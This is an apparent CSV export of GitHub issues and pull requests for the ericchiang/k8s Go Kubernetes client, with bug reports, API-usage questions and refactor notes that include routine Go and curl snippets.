ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/92,330054156,MDExOlB1bGxSZXF1ZXN0MTkzMTU3Mzc0,92,*: add options for setting the body of a DELETE request,2342749,closed,TRUE,NA,NA,2,2018-06-06T22:24:10Z,2018-07-25T15:02:45Z,2018-07-25T15:02:42Z,OWNER,NA,"closes #90 

cc @Luzifer for any feedback",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/92/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/92/comments,https://api.github.com/repos/ericchiang/k8s/issues/92/events,https://github.com/ericchiang/k8s/pull/92,https://api.github.com/repos/ericchiang/k8s/pulls/92
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/91,329971072,MDExOlB1bGxSZXF1ZXN0MTkzMDkyNzkw,91,*: fix watch test and update tests to use v1.10.4 API server,2342749,closed,TRUE,NA,NA,0,2018-06-06T17:54:48Z,2018-06-06T17:57:56Z,2018-06-06T17:57:50Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/91/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/91/comments,https://api.github.com/repos/ericchiang/k8s/issues/91/events,https://github.com/ericchiang/k8s/pull/91,https://api.github.com/repos/ericchiang/k8s/pulls/91
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/90,329807411,MDU6SXNzdWUzMjk4MDc0MTE=,90,Add support for DeletionPropagation,20142,closed,TRUE,NA,NA,2,2018-06-06T10:24:47Z,2018-07-25T15:02:42Z,2018-07-25T15:02:42Z,NONE,NA,"When deleting a job the spawned pods persist after the job has been deleted. The `kubectl` command as well as the API does support removing the related pods with one delete command using `DeletionPropagation`.

---

Trying to achieve this behaviour with `k8s.QueryParam()` leads to an error:

```go
[...]
        job := &batchv1.Job{}

        if err := client.Get(ctx, ""default"", name, job); err != nil {
                t.Fatalf(""client.Get failed: %s"", err)
        }

        if err := client.Delete(ctx, job, k8s.QueryParam(""propagationPolicy"", ""Background"")); err != nil {
                t.Fatalf(""client.Delete failed: %s"", err)
        }
[...]
```

> client.Delete failed: kubernetes api: Failure 400 converting (url.Values).[]string.[]string to (v1.DeleteOptions).*v1.DeletionPropagation.v1.DeletionPropagation: couldn't copy '[]string' into 'v1.DeletionPropagation'; didn't understand types

---

Also passing `*""github.com/ericchiang/k8s/apis/meta/v1"".DeleteOptions` as an `k8s.Option` does not work:

> cannot use *""github.com/ericchiang/k8s/apis/meta/v1"".DeleteOptions literal (type *""github.com/ericchiang/k8s/apis/meta/v1"".DeleteOptions) as type k8s.Option in argument to client.Client.Delete: *""github.com/ericchiang/k8s/apis/meta/v1"".DeleteOptions does not implement k8s.Option (missing k8s.updateURL method)

---

In order to delete the pods using the API it seems there must be a JSON payload in the `DELETE` request: https://github.com/kubernetes/kubernetes/issues/20902#issuecomment-321216843

---

So far it seems to me the only current way to clean up the pods as well is to collect them before deleting the job and delete them in separate requests which could be far more easy using the DeletionPropagation.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/90/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/90/comments,https://api.github.com/repos/ericchiang/k8s/issues/90/events,https://github.com/ericchiang/k8s/issues/90,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/89,329759183,MDU6SXNzdWUzMjk3NTkxODM=,89,Document supported Kubernetes versions/ dependency management,15986659,closed,TRUE,NA,NA,2,2018-06-06T08:12:26Z,2018-06-07T11:09:43Z,2018-06-06T17:13:03Z,NONE,NA,"Thank you Eric for this great and simplified K8s client.

Before digging deeper into it, what is your recommendation for managing dependencies of your k8s when using it in larger Go projects? Also, any support guidelines around which K8s versions are expected to work/not work?

Just want to make sure I get dep management right before falling off at a later stage...",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/89/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/89/comments,https://api.github.com/repos/ericchiang/k8s/issues/89/events,https://github.com/ericchiang/k8s/issues/89,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/88,327461720,MDExOlB1bGxSZXF1ZXN0MTkxMjUxMTE1,88,"fix pluralization for resources ending in 's', and 'y'",19318,closed,TRUE,NA,NA,3,2018-05-29T19:47:22Z,2018-05-29T20:32:10Z,2018-05-29T20:32:10Z,CONTRIBUTOR,NA,"Some of the pluralizations were wrong, fixed them and verified it with the upstream swagger.json",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/88/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/88/comments,https://api.github.com/repos/ericchiang/k8s/issues/88/events,https://github.com/ericchiang/k8s/pull/88,https://api.github.com/repos/ericchiang/k8s/pulls/88
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/87,322415966,MDU6SXNzdWUzMjI0MTU5NjY=,87,No default namespace for resource,151913,closed,TRUE,NA,NA,7,2018-05-11T19:56:23Z,2018-07-26T00:54:05Z,2018-07-26T00:54:05Z,NONE,NA,"When I attempt to create a Job without `Namespace: k8s.String(""default"")` specified in the Metadata I get a `no resource namespace provided` error. Is this the expected behavior?",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/87/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/87/comments,https://api.github.com/repos/ericchiang/k8s/issues/87/events,https://github.com/ericchiang/k8s/issues/87,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/86,318242778,MDExOlB1bGxSZXF1ZXN0MTg0NDk5MDk3,86,bump to Kubernetes v1.10,2342749,closed,TRUE,NA,NA,1,2018-04-27T00:48:51Z,2018-04-27T06:06:52Z,2018-04-27T00:52:59Z,OWNER,NA,closes https://github.com/ericchiang/k8s/issues/85,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/86/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/86/comments,https://api.github.com/repos/ericchiang/k8s/issues/86/events,https://github.com/ericchiang/k8s/pull/86,https://api.github.com/repos/ericchiang/k8s/pulls/86
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/85,314342772,MDU6SXNzdWUzMTQzNDI3NzI=,85,Missing CSIPersistentVolumeSource,4750892,closed,TRUE,NA,NA,1,2018-04-14T16:37:12Z,2018-04-27T00:52:59Z,2018-04-27T00:52:59Z,NONE,NA,"Solving this probably means updating to 1.10.
What is needed for that?",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/85/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/85/comments,https://api.github.com/repos/ericchiang/k8s/issues/85/events,https://github.com/ericchiang/k8s/issues/85,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/84,306300319,MDExOlB1bGxSZXF1ZXN0MTc1NzgyNjYy,84,*: add support for subresources,2342749,closed,TRUE,NA,NA,0,2018-03-19T00:17:44Z,2018-03-19T00:26:00Z,2018-03-19T00:25:58Z,OWNER,NA,closes https://github.com/ericchiang/k8s/issues/16,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/84/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/84/comments,https://api.github.com/repos/ericchiang/k8s/issues/84/events,https://github.com/ericchiang/k8s/pull/84,https://api.github.com/repos/ericchiang/k8s/pulls/84
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/83,306286019,MDExOlB1bGxSZXF1ZXN0MTc1Nzc1MTE2,83,*: fix deserialization of JSON errors,2342749,closed,TRUE,NA,NA,0,2018-03-18T21:43:34Z,2018-03-18T22:45:59Z,2018-03-18T22:45:56Z,OWNER,NA,"Have meta/v1.Status implement json decoding to support JSON encoded
errors from the API. This package's decoding logic won't unmarshal
a JSON payload into a protobuf message to prevent silent errors.
Protobuf types can allow JSON by implementing json.Unmarshaler.

Fixes https://github.com/ericchiang/k8s/issues/82",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/83/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/83/comments,https://api.github.com/repos/ericchiang/k8s/issues/83/events,https://github.com/ericchiang/k8s/pull/83,https://api.github.com/repos/ericchiang/k8s/pulls/83
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/82,306181291,MDU6SXNzdWUzMDYxODEyOTE=,82,cannot decode json payload into protobuf object,4750892,closed,TRUE,NA,NA,1,2018-03-17T18:57:31Z,2018-03-18T22:45:56Z,2018-03-18T22:45:56Z,NONE,NA,"Got the above error when trying to `Create` a custom resource.
I traced the problem to `v1.Status` not implementing `json.Unmarshaler`.

This is what happens:
- I called `Create`. Since I do not implement the protobuffer interface, it marshals to JSON
- I made a mistake in naming, so k8s returns an error in the form of a `Status` object encoded in JSON. (but this can be any normal error that k8s can return)
- The client detects the error and tries to unmarshal in `*v1.Status`.
- Since `Status` does implement the protobuffer interface but not `json.Unmarshaler`, the unmarshal function does not accept the JSON body.

The problem was gone when I excluded `*v1.Status` from the check in `unmarshal`.
```
	if isPBMsg {
		if _, ok := i.(*metav1.Status); ok {
			// only decode into JSON of a protobuf message if the type
			// explicitly implements json.Unmarshaler
			if _, ok := i.(json.Unmarshaler); !ok {
				return errors.New(""cannot decode json payload into protobuf object: "" + string(data) + "", "" + reflect.TypeOf(i).String())
			}
		}
	}
```",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/82/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/82/comments,https://api.github.com/repos/ericchiang/k8s/issues/82/events,https://github.com/ericchiang/k8s/issues/82,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/81,306032972,MDU6SXNzdWUzMDYwMzI5NzI=,81,Parsing kubeconfig's certificate-authority-data fails,1507504,open,TRUE,NA,NA,5,2018-03-16T18:27:39Z,2018-05-04T23:10:25Z,NA,NONE,NA,"certificate-authority-data (k8s. Cluster.CertificateAuthorityData) normally is a base64 string, but the current code somehow tries to translate it into ``[]uint8``:

```
yaml: unmarshal errors:
  line 6: cannot unmarshal !!str `LS0tLS1...` into []uint8
```",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/81/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/81/comments,https://api.github.com/repos/ericchiang/k8s/issues/81/events,https://github.com/ericchiang/k8s/issues/81,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/80,305691032,MDExOlB1bGxSZXF1ZXN0MTc1MzU3MDY1,80,*: fix docs,2342749,closed,TRUE,NA,NA,0,2018-03-15T19:33:57Z,2018-03-15T19:52:12Z,2018-03-15T19:52:09Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/80/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/80/comments,https://api.github.com/repos/ericchiang/k8s/issues/80/events,https://github.com/ericchiang/k8s/pull/80,https://api.github.com/repos/ericchiang/k8s/pulls/80
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/79,300701477,MDU6SXNzdWUzMDA3MDE0Nzc=,79,"User is ""system:anonymous"" when using out of cluster client with GKE",26710724,closed,TRUE,NA,NA,5,2018-02-27T16:30:46Z,2019-02-06T23:39:52Z,2018-03-07T22:10:34Z,NONE,NA,"Using the following code to create an out of cluster client:

```
	data, err := ioutil.ReadFile(utils.HomeDir() + ""/.kube/config"")
	if err != nil {
		panic(err)
	}

	// Unmarshal YAML into a Kubernetes config object.
	var config k8s.Config
	if err := yaml.Unmarshal(data, &config); err != nil {
		panic(err)
	}
	client, err := k8s.NewClient(&config)
```

I am getting the following error when I try to list pods in a namespace:
```
kubernetes api: Failure 403 pods is forbidden: User ""system:anonymous"" cannot list pods in the namespace ""ns"": No policy matched.
```

(I'm also running Kubernetes on a GKE cluster)

I've confirmed that the config in use is the same as the one that `kubectl` uses. I don't have any problems running `kubectl`.

Is there something extra I need to do in order to authenticate?

As mentioned in #77, I have chosen this library in that hope that it will abstract away a lot of the lower level Kubernetes functions and allow me to easily execute some simple commands on my cluster. I've raised this as an issue as I'm unsure where else to go, but it could be an error on my part.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/79/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/79/comments,https://api.github.com/repos/ericchiang/k8s/issues/79/events,https://github.com/ericchiang/k8s/issues/79,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/78,295416671,MDU6SXNzdWUyOTU0MTY2NzE=,78,cannot decode json payload into protobuf object,13634371,closed,TRUE,NA,NA,2,2018-02-08T07:58:50Z,2018-02-09T11:48:56Z,2018-02-09T11:48:56Z,NONE,NA,"I had a custom resource definition named ServiceMonitor, which was created by prometheus-operator (https://github.com/coreos/prometheus-operator). And I created struct definitions as follows:
```go
type ServiceEndpoint struct {
	Port *string `json:""port""`
}

type ServiceNamespaceSelector struct {
	MatchNames []string `json:""matchNames""`
}

type ServiceSelector struct {
	MatchLabels map[string]string `json:""matchLabels""`
}

type ServiceMonitorSpec struct {
	Endpoints         []*ServiceEndpoint        `json:""endpoints""`
	NamespaceSelector *ServiceNamespaceSelector `json:""namespaceSelector""`
	Selector          *ServiceSelector          `json:""selector""`
}

type ServiceMonitor struct {
	Metadata *k8s_io_apimachinery_pkg_apis_meta_v1.ObjectMeta `json:""metadata""`
	Spec     *ServiceMonitorSpec                              `json:""spec,omitempty""`
}
```
Then I called the client Create() function, it returned an error:
**decode error status 404: cannot decode json payload into protobuf object**
How can I solve this issue?",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/78/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/78/comments,https://api.github.com/repos/ericchiang/k8s/issues/78/events,https://github.com/ericchiang/k8s/issues/78,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/77,292897675,MDU6SXNzdWUyOTI4OTc2NzU=,77,Better documentation,879830,open,TRUE,NA,NA,2,2018-01-30T18:55:21Z,2018-02-01T18:50:13Z,NA,NONE,NA,"This most recent rewrite I am having a difficult time digging to see how to do basic things. ie: How do I scale a deployment, how do I update an image for a deployment? I have been able to pull out a pod list, iterate to find the container status where images are listed and altered those structures and attempted to update. No errors, but the images aren't changing. I haven't found any clue from the code how you could possibly scale a deployment either. I want this library to work with its less dependencies, but it seem very unfriendly for non experts of kubernetes now. Can you help me with these specific actions, and enhance the documentation or point me in the right place

I'm sorry if an Issue is the incorrect place for this kind of comment. I just don't know where else to go.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/77/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/77/comments,https://api.github.com/repos/ericchiang/k8s/issues/77/events,https://github.com/ericchiang/k8s/issues/77,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/76,291136218,MDExOlB1bGxSZXF1ZXN0MTY0Nzk0MTU2,76,register event list,11348478,closed,TRUE,NA,NA,4,2018-01-24T09:22:36Z,2018-01-24T18:51:29Z,2018-01-24T09:36:24Z,NONE,NA,"PTAL, thx.",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/76/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/76/comments,https://api.github.com/repos/ericchiang/k8s/issues/76/events,https://github.com/ericchiang/k8s/pull/76,https://api.github.com/repos/ericchiang/k8s/pulls/76
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/75,290215370,MDExOlB1bGxSZXF1ZXN0MTY0MTQxMDE3,75,fix API errors README example,2342749,closed,TRUE,NA,NA,0,2018-01-20T19:08:09Z,2018-08-29T21:15:33Z,2018-01-20T20:28:13Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/75/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/75/comments,https://api.github.com/repos/ericchiang/k8s/issues/75/events,https://github.com/ericchiang/k8s/pull/75,https://api.github.com/repos/ericchiang/k8s/pulls/75
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/74,290165056,MDU6SXNzdWUyOTAxNjUwNTY=,74,open /var/run/secrets/kubernetes.io/serviceaccount/namespace: no such file or directory,21237400,closed,TRUE,NA,NA,10,2018-01-20T04:48:15Z,2018-08-26T02:07:51Z,2018-01-23T01:08:15Z,NONE,NA,"```
go run test-client.go 
2018/01/19 23:45:12 open /var/run/secrets/kubernetes.io/serviceaccount/namespace: no such file or directory
exit status 1
```
I don't know why my system don't have this directory,
I use kubeadm to install my cluster, version 1.9
```
func main(){
    client, err := k8s.NewInClusterClient()
    if err != nil{
        log.Fatal(err)
    }   

    nodes, err := client.CoreV1().ListNodes(context.Background())
    if err != nil{
        log.Fatal(err)
    }   
    for _, node:= range nodes.Items{
        fmt.Println(""name=%q schedulable=%t\n"", *node.Metadata.Name, !*node.Spec.Unschedulable)    }
}      
```

can anyone help me?",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/74/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/74/comments,https://api.github.com/repos/ericchiang/k8s/issues/74/events,https://github.com/ericchiang/k8s/issues/74,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/73,288496220,MDExOlB1bGxSZXF1ZXN0MTYyODgwMDIx,73,*: refactor generation and add type registration,2342749,closed,TRUE,NA,NA,0,2018-01-15T06:58:28Z,2018-01-19T04:58:30Z,2018-01-19T04:58:27Z,OWNER,NA,"This PR is a large refactor of the library to add 1.9 support.

This is a large change because all types are now registered instead of being generated at the root of the repo. There are no more generated clients, just a common one that types are registered onto.

Changing the registration means:
* You only compile API groups you import.
* Users can register their own types the same way the core groups are registered.
* No more ""generated generics"" style `client.CoreV1().CreateFoo` just `client.Create`.

closes https://github.com/ericchiang/k8s/issues/70
closes https://github.com/ericchiang/k8s/issues/52
closes https://github.com/ericchiang/k8s/issues/63
closes https://github.com/ericchiang/k8s/issues/62
closes https://github.com/ericchiang/k8s/issues/61
closes https://github.com/ericchiang/k8s/issues/46
closes https://github.com/ericchiang/k8s/pull/66

Concretely creating a configmap went from:

```go
cm := &v1.ConfigMap{
    Metadata: &metav1.ObjectMeta{
        Name:      &name,
        Namespace: &client.Namespace,
    },
    Data: values,
}
// Will return the created configmap as well.
_, err := client.CoreV1().CreateConfigMap(context.TODO(), cm)
```

To:

```go
cm := &v1.ConfigMap{
    Metadata: &metav1.ObjectMeta{
        Name:      &name,
        Namespace: &client.Namespace,
    },
    Data: values,
}
err := client.Create(context.TODO(), cm) // Just Create, no typed clients
```

`Get`, `List`, and `Watch` saw the biggest changes, with responses being passed as arguments instead of being return values. For example, a `Get` now requires passing the type you want to decode into.

```go
// Get the configmap ""cluster-info"" in the namespace ""kube-public""
cm := new(v1.ConfigMap)
err := client.Get(context.TODO(), ""kube-public"", ""cluster-info"", cm)
```

Users can also register their own types using the `Register` and `RegisterList` methods.

```go
import (
    ""github.com/ericchiang/k8s""
    metav1 ""github.com/ericchiang/k8s/apis/meta/v1""
)

type MyResource struct {
    Metadata *metav1.ObjectMeta `json:""metadata""`
    Foo      string             `json:""foo""`
    Bar      int                `json:""bar""`
}

// Required for MyResource to implement k8s.Resource
func (m *MyResource) GetMetadata() *metav1.ObjectMeta {
    return m.Metadata
}

func init() {
    k8s.Register(""resource.example.com"", ""v1"", ""myresources"", true, &MyResource{})
}
```

Then `Create`, `Update`, `Delete`, and `Watch` the custom type the same as other resources.

TODOs before merge:
- [x] Tests for non-namespaced resources.
- [x] Tests for label selectors.",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/73/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/73/comments,https://api.github.com/repos/ericchiang/k8s/issues/73/events,https://github.com/ericchiang/k8s/pull/73,https://api.github.com/repos/ericchiang/k8s/pulls/73
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/72,288351106,MDExOlB1bGxSZXF1ZXN0MTYyNzkyMzY4,72,"*: fix formatting, remove tpr tests, remove watch all tests",2342749,closed,TRUE,NA,NA,0,2018-01-13T18:59:32Z,2018-01-13T19:01:46Z,2018-01-13T19:01:43Z,OWNER,NA,"Kubernetes clusters now come with a default configmap in kube-public
so a test that watches all namespaces needs more thought.",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/72/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/72/comments,https://api.github.com/repos/ericchiang/k8s/issues/72/events,https://github.com/ericchiang/k8s/pull/72,https://api.github.com/repos/ericchiang/k8s/pulls/72
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/71,287619258,MDExOlB1bGxSZXF1ZXN0MTYyMjYxNjUx,71,Add yaml tags to config object,6027,closed,TRUE,NA,NA,2,2018-01-10T23:59:36Z,2018-02-27T17:59:33Z,2018-01-14T20:30:24Z,CONTRIBUTOR,NA,Fixed issue where minikube config (in YAML) doesn't parse correctly because structs are missing yaml tags when using Config.,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/71/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/71/comments,https://api.github.com/repos/ericchiang/k8s/issues/71/events,https://github.com/ericchiang/k8s/pull/71,https://api.github.com/repos/ericchiang/k8s/pulls/71
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/70,286727163,MDU6SXNzdWUyODY3MjcxNjM=,70,1.8 and 1.9 app group versions changes,434575,closed,TRUE,NA,NA,1,2018-01-08T12:13:22Z,2018-01-19T04:58:27Z,2018-01-19T04:58:27Z,NONE,NA,"Looking at this https://kubernetes.io/docs/reference/workloads-18-19/ it seems the kube-api will change a bit for 1.8 and 1.9 versions . 

Will this library support those changes?

Thanks.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/70/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/70/comments,https://api.github.com/repos/ericchiang/k8s/issues/70/events,https://github.com/ericchiang/k8s/issues/70,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/69,285035141,MDU6SXNzdWUyODUwMzUxNDE=,69,Readme example,2528387,closed,TRUE,NA,NA,2,2017-12-29T05:13:04Z,2018-01-19T12:53:25Z,2018-01-19T04:59:30Z,NONE,NA,"I'm unable to follow the example in the readme and see pods in namespaces without an error 

The line that errors is 'pods, err := core.ListPods(ctx, k8s.AllNamespaces)' with 'undefined: core' and 'undefined: ctx'

This is using the latest version, with out of cluster auth, and the listing of nodes works just fine.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/69/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/69/comments,https://api.github.com/repos/ericchiang/k8s/issues/69/events,https://github.com/ericchiang/k8s/issues/69,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/68,284643385,MDU6SXNzdWUyODQ2NDMzODU=,68,proto: wrong wireType = 6 for field ServiceAccountName while watching pod,11348478,closed,TRUE,NA,NA,0,2017-12-27T03:49:08Z,2018-01-31T06:11:12Z,2018-01-31T06:11:12Z,NONE,NA,"Version I used:

""revision"": ""5803ed75e31fc1998b5f781ac08e22ff985c3f8f"",
""revisionTime"": ""2017-06-29T16:56:01Z""

kubectl version
```
Client Version: version.Info{Major:""1"", Minor:""7"", GitVersion:""v1.7.9"", GitCommit:""19fe91923d584c30bd6db5c5a21e9f0d5f742de8"", GitTreeState:""clean"", BuildDate:""2017-10-19T17:09:02Z"", GoVersion:""go1.8.3"", Compiler:""gc"", Platform:""linux/amd64""}
Server Version: version.Info{Major:""1"", Minor:""7"", GitVersion:""v1.7.9"", GitCommit:""19fe91923d584c30bd6db5c5a21e9f0d5f742de8"", GitTreeState:""clean"", BuildDate:""2017-10-19T16:55:06Z"", GoVersion:""go1.8.3"", Compiler:""gc"", Platform:""linux/amd64""}
```

",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/68/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/68/comments,https://api.github.com/repos/ericchiang/k8s/issues/68/events,https://github.com/ericchiang/k8s/issues/68,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/67,284304269,MDU6SXNzdWUyODQzMDQyNjk=,67,Watchers should allow a single resource,737085,closed,TRUE,NA,NA,2,2017-12-23T12:32:13Z,2018-01-23T11:57:26Z,2018-01-15T04:26:00Z,NONE,NA,"I want to watch for some resources (pods) and retrieve their IPs or change (e.g. delete/recreate). The simplest way to hook into this lifecycle is to group the pods in a Service and watch that endpoint.
Unfortunately, this library does not expose watch interface for a single resource by name. 

```client.CoreV1().WatchEndpoints``` is hard-coding the resource name as ```""""``` here:

```url := c.client.urlFor("""", ""v1"", namespace, ""endpoints"", """", options...)```

If I am not missing the right way to do that and it is in fact possible, can this be extended to pass the resource name in watch requests?

The equivalent HTTP API call is:

```curl -sSk -H ""Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/watch/namespaces/default/endpoints/rtpengine``` where ```rtpengine``` is the endpoint name.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/67/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/67/comments,https://api.github.com/repos/ericchiang/k8s/issues/67/events,https://github.com/ericchiang/k8s/issues/67,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/66,275086379,MDExOlB1bGxSZXF1ZXN0MTUzNDU0MTI1,66,separate watcher for json based third party resources,136472,closed,TRUE,NA,NA,0,2017-11-18T15:23:25Z,2018-01-19T04:58:27Z,2018-01-19T04:58:27Z,CONTRIBUTOR,NA,Fixes https://github.com/ericchiang/k8s/issues/62. It's slightly inefficient due to unmarshal -> marshal -> unmarshal the event.object. Any suggestions to improve on that?,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/66/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/66/comments,https://api.github.com/repos/ericchiang/k8s/issues/66/events,https://github.com/ericchiang/k8s/pull/66,https://api.github.com/repos/ericchiang/k8s/pulls/66
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/65,274188014,MDExOlB1bGxSZXF1ZXN0MTUyNzk4MzI1,65,"add watcher to thirdpartyresource, make code for watcher configurable",136472,closed,TRUE,NA,NA,3,2017-11-15T15:03:55Z,2017-11-18T15:24:11Z,2017-11-18T15:24:11Z,CONTRIBUTOR,NA,"Fixes issue https://github.com/ericchiang/k8s/issues/62. Because custom resources do not use protobuf, the codec in the watcher needed to be made configurable.",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/65/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/65/comments,https://api.github.com/repos/ericchiang/k8s/issues/65/events,https://github.com/ericchiang/k8s/pull/65,https://api.github.com/repos/ericchiang/k8s/pulls/65
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/64,274159268,MDExOlB1bGxSZXF1ZXN0MTUyNzc2NDYw,64,remove namespace check for thirdpartyresources,136472,closed,TRUE,NA,NA,1,2017-11-15T13:38:55Z,2017-11-20T20:51:41Z,2017-11-20T20:51:41Z,CONTRIBUTOR,NA,This tackles issue https://github.com/ericchiang/k8s/issues/61. Tested this with a namespaced CustomResourceDefinition.,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/64/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/64/comments,https://api.github.com/repos/ericchiang/k8s/issues/64/events,https://github.com/ericchiang/k8s/pull/64,https://api.github.com/repos/ericchiang/k8s/pulls/64
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/63,274151932,MDU6SXNzdWUyNzQxNTE5MzI=,63,Rename ThirdPartyResources to CustomResources,136472,closed,TRUE,NA,NA,0,2017-11-15T13:14:00Z,2018-01-19T04:58:27Z,2018-01-19T04:58:27Z,CONTRIBUTOR,NA,"ThirdPartyResource was the old name as far as I remember, but it has been renamed to CustomResourceDefinition. Perhaps useful to rename it in this client as well, or add it as an alias.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/63/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/63/comments,https://api.github.com/repos/ericchiang/k8s/issues/63/events,https://github.com/ericchiang/k8s/issues/63,NA
